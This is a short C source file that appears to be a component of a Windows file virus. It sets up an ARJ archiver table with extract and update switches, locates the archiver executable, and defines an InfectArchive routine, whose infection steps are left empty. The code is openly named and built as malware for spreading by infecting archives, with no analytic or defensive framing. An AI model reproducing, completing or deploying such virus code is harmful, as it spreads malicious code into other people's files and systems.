#include "winapp32.h"

struct TArcRec
{
 char ext[5];
 char exe_name[15];
 char unpack_params[20];
 char pack_params[20];
 char* full_path;
};

#define NUM_ARCHIVERS 1

TArcRec ArcData[NUM_ARCHIVERS] =
 {
  {".ARJ","ARJ.EXE","E -Y","U -Y",NULL}
 };


void CheckArchiverName(char* ss)
{
 char   Drive[MAX_PATH];;
 char   Dir[MAX_PATH];;
 char   Name[MAX_PATH];;
 char   Ext[MAX_PATH];;
 fnsplit(ss,Drive,Dir,Name,Ext);;
 strcat(Name,Ext);;
 for (int i=0; i<NUM_ARCHIVERS; i++)
 {
  if (stricmp(Name,ArcData[i].exe_name)==0)
	{ArcData[i].full_path = strdup(ss);; };;
 };;
}

void InfectArchive(char* TargetName)
{
 char sss[666];
 sprintf(sss,"Begin InfectArchive - %s",TargetName);;
 Log(sss);
 TArcRec Arc;;
 memset(&Arc,0,sizeof(Arc));;
 char* ss = Ext(TargetName);;
 for (int i=0; i<NUM_ARCHIVERS; i++)
 {
  if (stricmp(ss,ArcData[i].ext)==0) Arc = ArcData[i];;
 };;
 if (Arc.full_path==NULL) return;;


};

